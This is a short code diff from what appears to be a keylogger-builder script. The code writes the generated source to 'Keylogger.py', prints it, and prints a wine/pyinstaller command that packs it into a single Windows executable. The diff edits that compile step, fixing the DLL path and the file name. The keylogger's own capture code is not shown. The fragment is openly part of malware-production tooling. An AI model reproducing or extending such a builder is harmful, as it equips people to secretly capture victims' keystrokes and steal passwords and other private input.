@@ -47,10 +47,8 @@ def main(argv):
 		klgstr += keyconn
 		writefcontent("Keylogger.py",klgstr)
 		print(getfcontent("Keylogger.py"))
-		if sys.platform == "win32":
-			print("pyinstaller --onefile --hidden-import='pywintypes32.dll' Gkeylogger.py")
-		else:
-			print("wine pyinstaller --onefile --hidden-import='pywintypes32.dll' Gkeylogger.py")
+		if sys.platform != "win32":
+			print("wine pyinstaller --onefile --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
 	else:
 		print('Not implemented yet')
 
